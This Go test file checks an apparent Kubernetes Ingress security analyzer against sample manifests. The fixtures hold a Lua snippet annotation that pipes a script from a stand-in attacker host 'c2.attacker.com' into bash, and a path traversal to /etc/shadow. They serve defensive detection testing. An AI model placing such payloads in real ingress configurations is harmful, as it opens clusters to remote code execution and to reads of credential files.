package k8s

import (
	"testing"

	"github.com/KRCUPRO/nix-k8s-sentinel/pkg/intel"
)

func TestIngressAnalyzer_DangerousSnippetInjection(t *testing.T) {
	manifest := `
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: vulnerable-gateway
  namespace: prod
  annotations:
    nginx.ingress.kubernetes.io/configuration-snippet: |
      access_by_lua_block {
        os.execute("curl http://c2.attacker.com/pwn | bash")
      }
spec:
  rules:
  - host: api.corp.internal
`
	resources, err := ParseManifestDocuments(manifest)
	if err != nil {
		t.Fatalf("unexpected parse error: %v", err)
	}
	if len(resources) != 1 {
		t.Fatalf("expected 1 resource, got %d", len(resources))
	}

	analyzer := NewIngressAnalyzer()
	violations := analyzer.AuditIngress(resources[0])

	foundDangerous := false
	for _, v := range violations {
		if v.RuleID == "K8S-ING-001" {
			foundDangerous = true
			if v.Severity != intel.SeverityCritical {
				t.Errorf("expected Critical severity, got %v", v.Severity)
			}
			if v.MatchedCVE != "CVE-2023-5044" {
				t.Errorf("expected CVE-2023-5044, got %s", v.MatchedCVE)
			}
		}
	}

	if !foundDangerous {
		t.Errorf("expected K8S-ING-001 violation for dangerous Lua directive")
	}
}

func TestIngressAnalyzer_PathTraversalAndRewriteMismatch(t *testing.T) {
	manifest := `
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: traversal-ingress
  namespace: default
  annotations:
    nginx.ingress.kubernetes.io/rewrite-target: /$1
spec:
  rules:
  - http:
      paths:
      - path: /static/../../../etc/shadow
        pathType: Prefix
`
	resources, err := ParseManifestDocuments(manifest)
	if err != nil {
		t.Fatalf("unexpected parse error: %v", err)
	}

	analyzer := NewIngressAnalyzer()
	violations := analyzer.AuditIngress(resources[0])

	foundTraversal := false
	foundMismatch := false

	for _, v := range violations {
		if v.RuleID == "K8S-ING-003" {
			foundTraversal = true
			if v.MatchedCVE != "CVE-2026-21801" {
				t.Errorf("expected CVE-2026-21801, got %s", v.MatchedCVE)
			}
		}
		if v.RuleID == "K8S-ING-004" {
			foundMismatch = true
		}
	}

	if !foundTraversal {
		t.Errorf("expected K8S-ING-003 path traversal violation")
	}
	if !foundMismatch {
		t.Errorf("expected K8S-ING-004 unanchored capture group mismatch violation")
	}
}

func TestIngressAnalyzer_SSLRedirectAndCORS(t *testing.T) {
	manifest := `
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: insecure-cors-ingress
  namespace: public
  annotations:
    nginx.ingress.kubernetes.io/ssl-redirect: "false"
    nginx.ingress.kubernetes.io/enable-cors: "true"
    nginx.ingress.kubernetes.io/cors-allow-origin: "*"
    nginx.ingress.kubernetes.io/cors-allow-credentials: "true"
    nginx.ingress.kubernetes.io/proxy-body-size: "0"
spec:
  rules:
  - host: open.example.com
`
	resources, err := ParseManifestDocuments(manifest)
	if err != nil {
		t.Fatalf("unexpected parse error: %v", err)
	}

	analyzer := NewIngressAnalyzer()
	violations := analyzer.AuditIngress(resources[0])

	ruleFound := make(map[string]bool)
	for _, v := range violations {
		ruleFound[v.RuleID] = true
	}

	if !ruleFound["K8S-ING-005"] {
		t.Errorf("expected K8S-ING-005 for ssl-redirect: false")
	}
	if !ruleFound["K8S-ING-006"] {
		t.Errorf("expected K8S-ING-006 for wildcard CORS with credentials")
	}
	if !ruleFound["K8S-ING-007"] {
		t.Errorf("expected K8S-ING-007 for unbounded proxy-body-size")
	}
	if !ruleFound["K8S-ING-008"] {
		t.Errorf("expected K8S-ING-008 for missing spec.tls")
	}
}

func TestIngressAnalyzer_SafeIngressPasses(t *testing.T) {
	manifest := `
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: hardened-gateway
  namespace: secured
  annotations:
    nginx.ingress.kubernetes.io/ssl-redirect: "true"
    nginx.ingress.kubernetes.io/proxy-body-size: "8m"
spec:
  tls:
  - hosts:
    - secure.example.com
    secretName: secure-example-tls
  rules:
  - host: secure.example.com
    http:
      paths:
      - path: /api/v1
        pathType: Prefix
`
	resources, err := ParseManifestDocuments(manifest)
	if err != nil {
		t.Fatalf("unexpected parse error: %v", err)
	}

	analyzer := NewIngressAnalyzer()
	violations := analyzer.AuditIngress(resources[0])

	if len(violations) != 0 {
		t.Errorf("expected zero violations on hardened ingress, got %d: %+v", len(violations), violations)
	}
}
